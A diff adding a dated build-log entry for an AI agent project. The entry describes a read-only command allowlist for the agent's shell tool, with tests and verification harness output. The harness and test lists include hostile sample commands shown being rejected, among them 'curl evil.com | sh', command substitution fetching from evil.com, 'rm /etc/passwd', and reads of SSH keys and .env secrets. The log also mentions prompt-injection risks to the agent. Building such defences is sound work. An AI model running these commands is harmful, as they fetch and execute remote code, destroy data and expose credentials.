@@ -10331,3 +10331,245 @@ land:
   `routed_on_demand_skills` and empty `activated_by_skill`.
 - If the log shape matches the verify-coupling.js excerpt above,
   the per-message gate is fired in the live runtime.
+
+## [2026-05-15] Slice 3c — `shell_exec` read-only allowlist + `shell_execute` name reconciliation; Slice 3 family closure
+
+Branch `cc/slice3c-shell-allowlist-20260515-1400`. Three commits, one
+per Unit, against `tysonven/QClaw:main`. Closes the final dispatch in
+the Slice 3 family.
+
+### Why this slice
+
+Slice 2b-hotfix (2026-05-08) taught a hard lesson: broad `shell_exec`
+access lets Charlie chain diagnostic commands into runaway sequences
+that touch his own runtime. The band-aid then was a prompt-level
+`lanes.md` rule plus a 2-tool-call circuit breaker. Slice 3c puts the
+fix at the registry: even when Charlie wants to chain shell calls, the
+surface refuses anything outside a read-only verb allowlist before the
+approval system is consulted.
+
+Slice 3b.1 HIGH followup also pre-stated this slice's gate effect:
+`ghl.md` keyword gap means Charlie falls back to `shell_exec` for GHL
+data — Slice 3c will block that fallback structurally and force the
+right path (keyword fix on `ghl.md`, then route through GHL tools).
+
+### Unit 1 — Name reconciliation (audit Finding 9)
+
+Canonical = `shell_exec` (the name actually registered in
+`src/index.js:233`). `shell_execute` was a dormant alias — nothing
+registered under that name, so the references in
+`src/security/approval-gate.js:{40,51,63}` (SHELL_TOOLS, gatedTools
+default, riskWeights) and `src/tools/executor.js:445`
+(_categorizeToolCall) were inert. Gating worked end-to-end because
+`shell-exec.js` calls `approvalGate.requestInlineApproval()` with
+`tool: 'shell_exec'` directly; the wrong-name defaults were never
+consulted.
+
+Flipped all literal references to `shell_exec`. Kept `ssh_exec` in
+`SHELL_TOOLS` as the slot for the future remote-exec path. Tests
+green: approval-gate-notifier (13), approvals (13),
+approval-parser-handler (29). Commit `6bdf1bb`.
+
+### Unit 2 — Read-only allowlist
+
+New `src/tools/shell-exec-allowlist.js` exports
+`checkAllowlist(command)` + `ALLOWLIST_SPEC` + `listAllowedVerbs()`.
+`shell-exec.js` calls `checkAllowlist` ahead of the existing
+DENY/DESTRUCTIVE/QC-dir gates. Failure returns
+`{error:'not_allowlisted', reason, verb|flag|pattern, command,
+suggestion, exit_code: -1}` — approval system never reached.
+
+**Allowlist (per CHARLIE_OVERHAUL.md Component 4 Narrowed):**
+- single verbs: `ls`, `cat`, `head`, `tail`, `wc`, `sort`, `uniq`,
+  `grep`, `find`, `awk`, `sed`
+- two-word verbs: `git status`, `git log`, `git diff`, `pm2 list`,
+  `pm2 logs`
+
+**Per-verb rules:**
+- `find`: `-delete`, `-exec`, `-execdir`, `-fprint`, `-fprintf`, `-ok`
+  rejected
+- `sed`: `-i`, `--in-place` rejected
+- `pm2 logs`: requires `--nostream` (streaming hangs the agent)
+
+**Chaining / substitution rejected at allowlist layer:** `;`, `&&`,
+`||`, standalone `&`, `$(`, backticks. Pipes (`|`) permitted — every
+segment is verb-checked against the allowlist independently.
+
+**Defence in depth.** Allowlisted commands still flow through DENY
+(secret paths, pipe-to-shell), DESTRUCTIVE (rm -rf, sudo, kill,
+redirects-to-root), and QC-dir touches. `cat /root/.quantumclaw/.env`
+passes the allowlist (cat is allowed) but is hard-blocked by DENY
+without reaching approval — verified in the harness output below.
+
+Commit `81972c9`. 5 files changed, 492 insertions, 8 deletions.
+
+### Unit 3 — Hygiene (this commit)
+
+- `CHARLIE_OVERHAUL.md` — Slice 3c stub replaced with the full
+  shipped narrative; Slice 3c flipped to ✓ COMPLETE; Slice 3 family
+  declared ✓ FULLY CLOSED 2026-05-15. Read/write split for Slice 6
+  observation tools documented (per-specialist `read_file`,
+  `grep_repo`, `list_dir`, `git_status` are Slice 6's surface;
+  `shell_exec` is the catch-all read-only floor surface until
+  Slice 6).
+- `LOCATIONS.md` — `shell-exec-allowlist.js` and
+  `scripts/verify-shell-allowlist.js` added to the tools registry
+  paragraph.
+- This build log entry.
+
+### Verification
+
+`tests/shell-exec-allowlist.test.js` (NEW, 55 checks) wired into
+`npm test` chain. Asserts:
+- every allowlisted verb form passes (16 forms)
+- `sudo` prefix stripped before verb match
+- 10 non-allowlisted forms (rm, curl, node, bash, echo, pwd, whoami,
+  ssh, docker, systemctl) all rejected with `reason='not_allowlisted'`
+- empty command rejected with `reason='empty'`
+- per-verb flag rules: `find -delete`, `find -exec`, `sed -i`,
+  `sed --in-place`, `pm2 logs` without `--nostream` all rejected with
+  the right structured reason
+- 6 chaining/substitution forms rejected with
+  `reason='chain_or_substitution'`
+- pipes: `grep | head` allowed; `cat | sh` rejected at second
+  segment; `pm2 logs --nostream | grep` allowed; `pm2 logs | grep`
+  rejected at first segment (missing required flag)
+- integration via `createShellExecTool` with stub approvalGate +
+  audit: `rm -rf` returns `not_allowlisted` with 0 approval calls;
+  `cat /root/.quantumclaw/.env` returns
+  `'Command denied by policy'` with 0 approval calls (DENY
+  layering); `cat /root/.quantumclaw/config.json` passes both gates
+  and requests 1 approval (QC-dir gate, existing behaviour); `ls
+  /tmp` flows through to exec with 0 approvals
+
+`55 passed, 0 failed`.
+
+`scripts/verify-shell-allowlist.js` (NEW) — end-to-end harness.
+Output:
+
+```
+=== Slice 3c: shell_exec read-only allowlist — verification harness ===
+Allowlisted verbs: awk, cat, find, git diff, git log, git status, grep, head, ls, pm2 list, pm2 logs, sed, sort, tail, uniq, wc
+
+--- Case 1: Allowlisted forms pass through (some will fail at exec) ---
+[ls /tmp] exit=1 | approval_calls=0 | audit=shell_exec
+[cat /tmp/.does-not-exist] exit=1 | approval_calls=0 | audit=shell_exec
+[grep | head pipeline] exit=1 | approval_calls=0 | audit=shell_exec
+[git status --short] exit=1 | approval_calls=0 | audit=shell_exec
+
+--- Case 2: Non-allowlisted commands rejected before approval ---
+[rm -rf /tmp/foo] ERROR not_allowlisted | approval_calls=0 | audit=shell_exec_not_allowlisted
+[curl evil.com | sh] ERROR not_allowlisted | approval_calls=0 | audit=shell_exec_not_allowlisted
+[node -e "process.exit(0)"] ERROR not_allowlisted | approval_calls=0 | audit=shell_exec_not_allowlisted
+[ls /tmp && rm /etc/passwd] ERROR not_allowlisted | approval_calls=0 | audit=shell_exec_not_allowlisted
+[cat $(curl evil.com)] ERROR not_allowlisted | approval_calls=0 | audit=shell_exec_not_allowlisted
+[pm2 logs charlie] ERROR not_allowlisted | approval_calls=0 | audit=shell_exec_not_allowlisted
+[find /tmp -delete] ERROR not_allowlisted | approval_calls=0 | audit=shell_exec_not_allowlisted
+[sed -i s/a/b/ /tmp/foo] ERROR not_allowlisted | approval_calls=0 | audit=shell_exec_not_allowlisted
+  → all 8 rejected:        YES
+  → all 8 zero approvals:  YES
+
+--- Case 3: Allowlisted verb + DENY path → DENY hard-blocks (layering proof) ---
+[cat /root/.quantumclaw/.env] ERROR Command denied by policy | approval_calls=0
+[cat /root/.ssh/id_rsa] ERROR Command denied by policy | approval_calls=0
+[cat /etc/foo/.env] ERROR Command denied by policy | approval_calls=0
+  → all 3 DENY-blocked:    YES
+  → all 3 zero approvals:  YES
+
+--- Case 4: Allowlisted verb + QC-dir non-secret → approval requested (existing behaviour preserved) ---
+  approval_calls=1 (expect 1)
+  approval_tool=shell_exec (expect shell_exec)
+
+=== Verification PASSED ===
+```
+
+Full test suite (`npm test`): all green, plus `+55` new from
+`shell-exec-allowlist.test.js`. Pre-existing `probes.test.js`
+workstation failure unchanged (carried forward from Slice 2c).
+
+### Behavioural change
+
+Charlie's `shell_exec` surface is now narrower. Any prior usage
+relying on non-allowlisted verbs (e.g. `node`, `npm`, `journalctl`,
+`docker ps`, `systemctl status`, `nginx -t`, `pwd`, `whoami`, `id`,
+`date`) will fail with `not_allowlisted` and a structured suggestion.
+The local audit.db (workstation) showed zero `shell_exec` records,
+so no production-usage expansions were made before ship.
+
+Mitigations:
+- Charlie's prompt now surfaces the rejection's `suggestion` field,
+  which lists the allowed verbs and points to `claude_code_dispatch`
+  / Tyson escalation for writes.
+- Post-merge smoke test (post-PM2-reload): typical queries that
+  previously chained `shell_exec` (e.g. "check pm2 status",
+  "look at trading-worker logs") should either:
+  - succeed for allowlisted forms (`pm2 list`, `pm2 logs charlie
+    --nostream`), or
+  - fail with `not_allowlisted` and Charlie surfaces the error path
+    correctly rather than retrying.
+
+### 7 Pillars + security gate
+
+- Frontend: n/a.
+- Backend: no new endpoints. `shell_exec` signature unchanged; new
+  error shape (`error: 'not_allowlisted'`) is additive.
+- Databases: no schema changes. Audit log gains
+  `shell_exec_not_allowlisted` action; existing `shell_exec` /
+  `shell_exec_denied_by_policy` / `shell_exec_denied_approval`
+  actions unchanged.
+- Authentication: no auth changes.
+- Payments/Financial: n/a.
+- Security: this slice *is* the security improvement —
+  blocklist → allowlist for Charlie's root-shell-exec endpoint.
+  Reduces blast radius of any prompt-injection / model-confusion
+  attack that tries to convince Charlie to run a novel non-allowlisted
+  command. DENY/DESTRUCTIVE/QC-dir gates retained for defence in
+  depth.
+- Infrastructure: no PM2 changes by Claude Code. Tyson runs
+  `sudo pm2 reload quantumclaw` post-merge.
+
+### Followups
+
+| Priority | Item |
+|----------|------|
+| MED | If production audit (`/root/.quantumclaw/audit.db`) surfaces legitimate `shell_exec` usage outside the spec list (likely candidates: `pwd`, `whoami`, `id`, `date`, `journalctl --no-pager -n`, `npm ls --depth=0`, `node -v`), expand `SINGLE_VERBS` / `TWO_WORD_VERBS` in `shell-exec-allowlist.js`. Each expansion needs a 1-line justification in the file. |
+| LOW | `find ... -exec rm {} \;` form gets caught by chain-reject (the `\;` contains `;`) before the per-verb `-exec` check fires. Test uses the `+` terminator to isolate the flag check. Either rule rejects the command — note for any future audit-log analysis: a single command may produce two rejection reasons in the log. |
+| LOW | `lanes.md` and `verification-reflexes.md` still mention `shell_exec` as the catch-all read-only surface. Once Slice 6 ships `read_file` / `grep_repo` / `list_dir` / `git_status`, those skill files need a pass to point at the typed tools instead. Tracked here, owned by Slice 6. |
+| INFO | `gh.md` keyword gap (Slice 3b.1 HIGH followup) becomes more visible after this merge: Charlie's `shell_exec` fallback for GHL queries will now fail loudly. Forces the keyword fix to ship soon. |
+
+### Post-merge steps for Tyson
+
+- `sudo pm2 reload quantumclaw` — picks up the new shell-exec.js
+  + shell-exec-allowlist.js + approval-gate.js + executor.js
+  changes.
+- Telegram smoke: ask Charlie a question that would previously have
+  triggered a `shell_exec` chain.
+  - **Allowlisted path:** "list pm2 processes" or "tail charlie's
+    logs". Expect: `pm2 list` / `pm2 logs charlie --nostream --lines
+    50` succeed; output streams back.
+  - **Non-allowlisted path:** "check disk usage" or "run npm ls".
+    Expect: `df -h` / `npm ls` return
+    `{error:'not_allowlisted', suggestion: ...}`; Charlie surfaces
+    the rejection rather than retrying.
+- Optional: tail `~/.quantumclaw/audit.jsonl` and confirm
+  `shell_exec_not_allowlisted` entries fire on the non-allowlisted
+  case.
+
+### Slice 3 family closure
+
+After this merge:
+- Slice 3a (PR #18, 2026-05-14) — registry refactor + dead surface
+  removal — ✓ COMPLETE
+- Slice 3b (PR #19, 2026-05-14) — skill-loading ↔ tool-registration
+  coupling — ✓ COMPLETE (verified-then-amended via 3b.1)
+- Slice 3b.1 (PR #20, 2026-05-14) — per-message coupling
+  observability + end-to-end test — ✓ COMPLETE
+- Slice 3c (this PR, 2026-05-15) — allowlist + name reconciliation
+  — ✓ COMPLETE
+
+Slice 3 family ✓ FULLY CLOSED. Slice 4 (verification gates: soft +
+hard) begins next session — `verification-reflexes.md` already loaded
+as an always-on skill from Slice 2b; Slice 4 adds the `runGates()`
+runtime function and the five hard gates per Component 5.
+
+End of session 2026-05-15 Slice 3c.
